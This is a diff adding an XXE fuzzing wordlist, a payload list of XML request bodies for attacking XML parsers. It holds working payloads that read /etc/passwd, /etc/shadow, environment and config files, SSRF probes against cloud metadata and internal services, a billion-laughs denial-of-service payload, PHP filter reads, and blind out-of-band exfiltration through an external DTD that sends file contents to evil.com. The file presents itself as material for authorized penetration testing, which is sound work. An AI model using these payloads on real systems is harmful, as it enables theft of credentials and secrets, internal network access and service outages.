@@ -1,0 +1,103 @@
+# ============================================================
+# XXE (XML External Entity) Fuzzing Wordlist
+# Usage: submit as full XML request bodies (Content-Type: application/xml)
+# Replace evil.com with your own Collaborator/interact.sh domain.
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Basic file disclosure (Linux)
+# ---------------------------------------
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><foo>&xxe;</foo>
+
+# ---------------------------------------
+# SECTION 2: Basic file disclosure (Windows)
+# ---------------------------------------
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>
+
+# ---------------------------------------
+# SECTION 3: SSRF via XXE
+# ---------------------------------------
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/ssrf-test">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">]><foo>&xxe;</foo>
+
+# ---------------------------------------
+# SECTION 4: Blind XXE - out-of-band via external DTD
+# (host the .dtd file on your own server; replace evil.com)
+# ---------------------------------------
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/malicious.dtd">%xxe;]><foo>test</foo>
+
+# --- malicious.dtd content to host on evil.com (reference only) ---
+# <!ENTITY % file SYSTEM "file:///etc/passwd">
+# <!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://evil.com/?x=%file;'>">
+# %eval;
+# %exfil;
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe; %send;]>
+
+# ---------------------------------------
+# SECTION 5: Parameter entity blind detection (out-of-band ping only)
+# ---------------------------------------
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/">%xxe;]><foo>test</foo>
+
+<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/nonexistent.dtd"><data>test</data>
+
+# ---------------------------------------
+# SECTION 6: Billion laughs / entity expansion DoS
+# ---------------------------------------
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lolz>&lol5;</lolz>
+
+# ---------------------------------------
+# SECTION 7: Error-based file read (forces parser error containing file contents)
+# ---------------------------------------
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]>
+
+# ---------------------------------------
+# SECTION 8: XInclude-based (when only a fragment, not full DOCTYPE, is user-controlled)
+# ---------------------------------------
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://evil.com/"/></foo>
+
+# ---------------------------------------
+# SECTION 9: SOAP / file-upload-embedded XXE (e.g. inside DOCX/XLSX/SVG)
+# ---------------------------------------
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>
+
+<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
+
+# ---------------------------------------
+# SECTION 10: PHP wrapper via XXE (base64-encode file to bypass content restrictions)
+# ---------------------------------------
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - If the response reflects entity content directly, use Section 1/2
+#   (in-band). If nothing is reflected, switch to Section 4/5 blind
+#   OOB technique with your own Collaborator/interact.sh domain hosting
+#   a .dtd file.
+# - Section 6 (billion laughs) is a DoS payload — only run with explicit
+#   authorization and awareness it can crash the target service.
+# - Many upload-based formats (DOCX, XLSX, SVG, PPTX) are ZIPs containing
+#   XML internally — Section 9 patterns apply once unzipped and re-zipped
+#   with the malicious XML swapped in.
+# - Only use against systems you are explicitly authorized to test.
